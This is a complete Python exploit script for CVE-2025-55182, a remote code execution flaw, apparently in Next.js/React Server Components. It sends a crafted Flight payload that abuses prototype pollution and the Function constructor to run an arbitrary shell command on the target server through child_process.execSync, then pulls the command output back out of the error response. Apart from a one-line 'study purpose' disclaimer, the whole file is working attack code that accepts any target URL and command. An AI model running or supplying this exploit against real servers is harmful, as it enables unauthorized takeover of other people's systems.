# Remote Code Execution script to exploit CVE-2025-55182
# reference: https://github.com/msanft/CVE-2025-55182
# This is just for study purpose.
import sys
import json
import requests


def build_payload(executable):
    """Build the malicious Flight payload that runs `executable` on the server."""
    prefix = (
        f"var res = process.mainModule.require('child_process')"
        f".execSync('{executable} 2>&1 || true',{{'timeout':5000}}).toString().trim(); "
        f"throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});"
    )
    return {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then": "$B0"}',
        "_response": {
            "_prefix": prefix,
            "_formData": {
                "get": "$1:constructor:constructor",
            },
        },
    }


def exploit(base_url, executable):
    """Send the exploit request and return the response."""
    files = {
        "0": (None, json.dumps(build_payload(executable))),
        "1": (None, '"$@0"'),
    }
    headers = {"Next-Action": "x"}
    return requests.post(base_url, files=files, headers=headers, timeout=10)


def parse_output(response_text):
    """Extract the command output from the server's error line.

    The command runs with `2>&1 || true`, so stdout+stderr always come back in
    the "digest" field regardless of the command's exit code.
    """
    for line in response_text.splitlines():
        if '"digest"' in line:
            return json.loads(line[line.index("{"):]).get("digest", "")
    return ""


def main():
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
    executable = sys.argv[2] if len(sys.argv) > 2 else "id"

    res = exploit(base_url, executable)
    print(f"status code: {res.status_code}")
    print(f"response text:\n{res.text}")
    print(f"executable response:\n{parse_output(res.text)}")


if __name__ == "__main__":
    main()
